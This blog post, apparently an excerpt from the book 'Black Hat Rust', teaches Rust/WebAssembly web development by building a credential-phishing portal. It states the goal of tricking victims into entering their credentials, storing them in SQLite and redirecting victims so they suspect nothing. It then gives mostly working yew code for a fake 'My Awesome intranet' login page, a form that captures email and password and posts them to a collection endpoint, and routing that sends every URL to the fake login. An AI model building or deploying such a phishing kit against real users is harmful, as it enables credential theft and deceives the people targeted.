+++
date = 2022-06-14T00:15:00Z
title = "Building a web application with Rust and WebAssembly"
type = "post"
tags = ["hacking", "programming", "rust", "tutorial"]
authors = ["Sylvain Kerkour"]
url = "/web-application-with-rust-and-webassembly"

[extra]
lang = "en"

comment ="""
"""
+++

Whether it be with React, VueJS, Angular, or in Rust, modern web applications are composed of 3 kinds of pieces:

* Components
* Pages
* Service

![Architecture of a client web application](https://kerkour.com/black-hat-rust/assets/ch09_webapp_client.png)


**Components** are reusable pieces and UI elements. An input field, or a button, for example.

**Pages** are assemblies of components. They match **routes** (URLs). For example, the `Login` page matches the `/login` route. The `Home` page matches the `/` route.

And finally, **Services** are auxiliary utilities to wrap low-level features or external services such as an HTTP client, Storage...


The goal of our application is simple: It's a portal where the victim will enter their credentials (thinking that it's a legitimate form), the credentials are going to be saved in an SQLite database, and then we redirect the victims to an error page to let them think that the service is temporarily unavailable and they should try again later.


> This post is an excerpt from my book [Black Hat Rust](https://kerkour.com/black-hat-rust)


### Installing the toolchain

[`wasm-pack`](https://github.com/rustwasm/wasm-pack) helps you build Rust-generated WebAssembly packages and use it in the browser or with Node.js.

```bash
$ cargo install -f wasm-pack
```

### Models

Note that one great thing about using the same language on the backend as on the frontend is the ability to reuse models:

**[ch_09/phishing/common/src/api.rs](https://github.com/skerkour/black-hat-rust/blob/main/ch_09/phishing/common/src/api.rs)**
```rust
pub mod model {
    use serde::{Deserialize, Serialize};

    #[derive(Debug, Clone, Serialize, Deserialize)]
    #[serde(rename_all = "snake_case")]
    pub struct Login {
        pub email: String,
        pub password: String,
    }

    #[derive(Debug, Clone, Serialize, Deserialize)]
    #[serde(rename_all = "snake_case")]
    pub struct LoginResponse {
        pub ok: bool,
    }
}

pub mod routes {
    pub const LOGIN: &str = "/api/login";
}
```

Now, if we make a change, there is no need to manually do the same change elsewhere. Adios the desynchronized model problems.



### Components

In the beginning, there are components. Components are reusable pieces of functionality or design.

To build our components, we use the [`yew`](https://yew.rs/), crate which is, as I'm writing this, the most advanced and supported Rust frontend framework.


`Properties` (or `Props`) can be seen as the parameters of a component. For examples, the function `fn factorial(x: u64) -> u64` has a parameter `x`. With components, it's the same thing. If we want to render them with specific data, we use `Properties`.

**[ch_09/phishing/webapp/src/components/error_alert.rs](https://github.com/skerkour/black-hat-rust/blob/main/ch_09/phishing/webapp/src/components/error_alert.rs)**
```rust
use yew::{html, Component, ComponentLink, Html, Properties, ShouldRender};

pub struct ErrorAlert {
    props: Props,
}

#[derive(Properties, Clone)]
pub struct Props {
    #[prop_or_default]
    pub error: Option<crate::Error>,
}
```


```rust
impl Component for ErrorAlert {
    type Message = ();
    type Properties = Props;

    fn create(props: Self::Properties, _: ComponentLink<Self>) -> Self {
        ErrorAlert { props }
    }

    fn update(&mut self, _: Self::Message) -> ShouldRender {
        true
    }

    fn change(&mut self, props: Self::Properties) -> ShouldRender {
        self.props = props;
        true
    }

    fn view(&self) -> Html {
        if let Some(error) = &self.props.error {
            html! {
                <div class="alert alert-danger" role="alert">
                    {error}
                </div>
            }
        } else {
            html! {}
        }
    }
}
```

Pretty similar to (old-school) React, isn't it?

Another component is the `LoginForm` which wraps the logic to capture and save credentials.

**[ch_09/phishing/webapp/src/components/login_form.rs](https://github.com/skerkour/black-hat-rust/blob/main/ch_09/phishing/webapp/src/components/login_form.rs)**
```rust
pub struct LoginForm {
    link: ComponentLink<Self>,
    error: Option<Error>,
    email: String,
    password: String,
    http_client: HttpClient,
    api_response_callback: Callback<Result<model::LoginResponse, Error>>,
    api_task: Option<FetchTask>,
}

pub enum Msg {
    Submit,
    ApiResponse(Result<model::LoginResponse, Error>),
    UpdateEmail(String),
    UpdatePassword(String),
}
```

```rust
impl Component for LoginForm {
    type Message = Msg;
    type Properties = ();

    fn create(_: Self::Properties, link: ComponentLink<Self>) -> Self {
        Self {
            error: None,
            email: String::new(),
            password: String::new(),
            http_client: HttpClient::new(),
            api_response_callback: link.callback(Msg::ApiResponse),
            link,
            api_task: None,
        }
    }
```

```rust
    fn update(&mut self, msg: Self::Message) -> ShouldRender {
        match msg {
            Msg::Submit => {
                self.error = None;
                // let credentials = format!("email: {}, password: {}", &self.email, &self.password);
                // console::log_1(&credentials.into());
                let credentials = model::Login {
                    email: self.email.clone(),
                    password: self.password.clone(),
                };
                self.api_task = Some(self.http_client.post::<model::Login, model::LoginResponse>(
                    api::routes::LOGIN.to_string(),
                    credentials,
                    self.api_response_callback.clone(),
                ));
            }
            Msg::ApiResponse(Ok(_)) => {
                console::log_1(&"success".into());
                self.api_task = None;
                let window: Window = web_sys::window().expect("window not available");
                let location = window.location();
                let _ = location.set_href("https://kerkour.com/black-hat-rust");
            }
            Msg::ApiResponse(Err(err)) => {
                self.error = Some(err);
                self.api_task = None;
            }
            Msg::UpdateEmail(email) => {
                self.email = email;
            }
            Msg::UpdatePassword(password) => {
                self.password = password;
            }
        }
        true
    }
```

And finally, the `view` function (similar to `render` with other frameworks).

```rust
    fn view(&self) -> Html {
        let onsubmit = self.link.callback(|ev: FocusEvent| {
            ev.prevent_default(); /* Prevent event propagation */
            Msg::Submit
        });
        let oninput_email = self
            .link
            .callback(|ev: InputData| Msg::UpdateEmail(ev.value));
        let oninput_password = self
            .link
            .callback(|ev: InputData| Msg::UpdatePassword(ev.value));
```

You can embed other components (here `ErrorAlert`) like any other HTML element:
```rust
        html! {
            <div>
                <components::ErrorAlert error=&self.error />
                <form onsubmit=onsubmit>
                    <div class="mb-3">
                        <input
                            class="form-control form-control-lg"
                            type="email"
                            placeholder="Email"
                            value=self.email.clone()
                            oninput=oninput_email
                            id="email-input"
                        />
                    </div>
                    <div class="mb-3">
                        <input
                            class="form-control form-control-lg"
                            type="password"
                            placeholder="Password"
                            value=self.password.clone()
                            oninput=oninput_password
                        />
                    </div>
                    <button
                        class="btn btn-lg btn-primary pull-xs-right"
                        type="submit"
                        disabled=false>
                        { "Sign in" }
                    </button>
                </form>
            </div>
        }
    }
}
```

### Pages

Pages are assemblages of components and are components themselves in yew.

**[ch_09/phishing/webapp/src/pages/login.rs](https://github.com/skerkour/black-hat-rust/blob/main/ch_09/phishing/webapp/src/pages/login.rs)**
```rust
pub struct Login {}

impl Component for Login {
    type Message = ();
    type Properties = ();

    // ...

    fn view(&self) -> Html {
        html! {
            <div>
                <div class="container text-center mt-5">
                    <div class="row justify-content-md-center mb-5">
                        <div class="col col-md-8">
                            <h1>{ "My Awesome intranet" }</h1>
                        </div>
                    </div>
                    <div class="row justify-content-md-center">
                        <div class="col col-md-8">
                            <LoginForm />
                        </div>
                    </div>
                </div>
            </div>
        }
    }
}
```


### Routing

Then we declare all the possible routes of our application.

As we saw previously, routes map URLs to pages.

**[ch_09/phishing/webapp/src/lib.rs](https://github.com/skerkour/black-hat-rust/blob/main/ch_09/phishing/webapp/src/lib.rs)**
```rust
#[derive(Switch, Debug, Clone)]
pub enum Route {
    #[to = "*"]
    Fallback,
    #[to = "/error"]
    Error,
    #[to = "/"]
    Login,
}
```



### Services

#### Making HTTP requests

Making HTTP requests is a little bit harder, as we need a callback and to deserialize the responses.

**[ch_09/phishing/webapp/src/services/http_client.rs](https://github.com/skerkour/black-hat-rust/blob/main/ch_09/phishing/webapp/src/services/http_client.rs)**
```rust
#[derive(Default, Debug)]
pub struct HttpClient {}

impl HttpClient {
    pub fn new() -> Self {
        Self {}
    }

    pub fn post<B, T>(
        &mut self,
        url: String,
        body: B,
        callback: Callback<Result<T, Error>>,
    ) -> FetchTask
    where
        for<'de> T: Deserialize<'de> + 'static + std::fmt::Debug,
        B: Serialize,
    {
        let handler = move |response: Response<Text>| {
            if let (meta, Ok(data)) = response.into_parts() {
                if meta.status.is_success() {
                    let data: Result<T, _> = serde_json::from_str(&data);
                    if let Ok(data) = data {
                        callback.emit(Ok(data))
                    } else {
                        callback.emit(Err(Error::DeserializeError))
                    }
                } else {
                    match meta.status.as_u16() {
                        401 => callback.emit(Err(Error::Unauthorized)),
                        403 => callback.emit(Err(Error::Forbidden)),
                        404 => callback.emit(Err(Error::NotFound)),
                        500 => callback.emit(Err(Error::InternalServerError)),
                        _ => callback.emit(Err(Error::RequestError)),
                    }
                }
            } else {
                callback.emit(Err(Error::RequestError))
            }
        };

        let body: Text = Json(&body).into();
        let builder = Request::builder()
            .method("POST")
            .uri(url.as_str())
            .header("Content-Type", "application/json");
        let request = builder.body(body).unwrap();

        FetchService::fetch(request, handler.into()).unwrap()
    }
}
```

That being said, it has the advantage of being extremely robust as all possible errors are handled. No more uncaught runtime errors that you will never know about.

### App

Then comes the `App` component, which wraps everything and renders the routes.

**[ch_09/phishing/webapp/src/lib.rs](https://github.com/skerkour/black-hat-rust/blob/main/ch_09/phishing/webapp/src/lib.rs)**
```rust
pub struct App {}

impl Component for App {
    type Message = ();
    type Properties = ();

    // ...

    fn view(&self) -> Html {
        let render = Router::render(|switch: Route| match switch {
            Route::Login | Route::Fallback => html! {<pages::Login/>},
            Route::Error => html! {<pages::Error/>},
        });

        html! {
            <Router<Route, ()> render=render/>
        }
    }
}
```

And finally, the entrypoint to mount and launch the webapp:
```rust
#[wasm_bindgen(start)]
pub fn run_app() {
    yew::App::<App>::new().mount_to_body();
}
```


You can run you freshly built web application by running:

```bash
$ make webapp_debug
$ make serve
```

## The code is on GitHub

As usual, you can find the code on GitHub: [github.com/skerkour/black-hat-rust](https://github.com/skerkour/black-hat-rust/tree/main/ch_09/phishing) (please don't forget to star the repo 🙏).


